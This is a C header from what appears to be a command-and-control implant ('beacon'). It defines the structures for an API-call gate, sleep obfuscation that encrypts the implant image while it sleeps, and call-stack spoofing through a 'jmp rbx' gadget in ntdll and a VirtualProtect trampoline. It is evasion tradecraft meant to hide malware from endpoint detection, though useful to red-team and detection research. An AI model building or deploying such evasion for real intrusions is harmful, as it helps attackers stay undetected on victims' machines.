/* beacon/include/Gate.h
 * Shared between beacon gate wrappers and sleepmask dispatcher.
 * No dependency on Instance.h - only windows.h for base types. */

#pragma once
#include <windows.h>

#define GATE_MAX_ARGS  10

typedef enum _GATE_API {
    GATE_API_GENERIC                   = 0x00,
    GATE_API_SLEEP                     = 0x01,
    GATE_API_WAIT_FOR_SINGLE_OBJECT    = 0x02,
    GATE_API_WAIT_FOR_MULTIPLE_OBJECTS = 0x03,
    GATE_API_VIRTUAL_PROTECT           = 0x04,
} GATE_API;

typedef struct _FUNCTION_CALL {
    PVOID      FunctionPtr;
    UINT32     GateApi;
    UINT32     NumArgs;
    ULONG_PTR  Args[GATE_MAX_ARGS];
    ULONG_PTR  RetValue;
    PVOID      SmInfo;
} FUNCTION_CALL, *PFUNCTION_CALL;

typedef ULONG_PTR (*FN0 )( VOID );
typedef ULONG_PTR (*FN1 )( ULONG_PTR );
typedef ULONG_PTR (*FN2 )( ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN3 )( ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN4 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN5 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN6 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN7 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN8 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN9 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN10)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );

/* ========= [ sleepmask shared state ] =========
 * Shared between the beacon gate wrappers (Sleepmask.c) and the sleepmask BOF
 * (src_sleepmask). Lives here — not Instance.h — so the BOF (which must not
 * include Instance.h) can read SmInfo via FnCall->SmInfo. Keep this in sync
 * with the layout the beacon populates in Bootstrap.c / Sleepmask.c. */

/* sleep obfuscation runtime config */
typedef struct _NAX_SM_CONFIG {
    BYTE  SleepObf;       /* 0=disabled, 1=enabled (encrypt during sleep) */
    BYTE  _pad;
} NAX_SM_CONFIG, *PNAX_SM_CONFIG;

/* sleepmask info - image region for encrypt/decrypt */
typedef struct _NAX_SM_INFO {
    PVOID   BeaconBase;
    UINT32  BeaconSize;
    PVOID   SmBase;
    UINT32  SmSize;
    PVOID   CleanTextBuf;
    UINT32  CleanTextSize;
    NAX_SM_CONFIG Config;
    UINT32  ActiveJobCount;
    /* P4 stack-spoof (populated by the beacon when NAX_SPOOF_STACK, read by the
       sleepmask BOF). Unconditional fields keep the gate ABI identical on both
       sides; SpoofReady=0 -> BOF falls back to a direct VirtualProtect call. */
    PVOID   VpPtr;          /* real kernel32!VirtualProtect (pre-gate-swap) -- trampoline jmps here */
    PVOID   JmpRbxGadget;   /* FF E3 (jmp rbx) in ntdll .text: VP immediate-return gadget */
    PVOID   StackFiller;    /* image-backed ntdll addr for the deeper spoofed return slots */
    PVOID   NtdllBase;      /* ntdll image base: bound the RBP walk + image-backed test */
    SIZE_T  NtdllSize;      /* ntdll SizeOfImage */
    UINT32  SpoofReady;     /* 1 = gadget+filler resolved; 0 = spoof disabled */
    UINT32  SpoofCount;     /* P4 diagnostic: incremented by the trampoline on every spoofed VP (zero-init) */
} NAX_SM_INFO, *PNAX_SM_INFO;
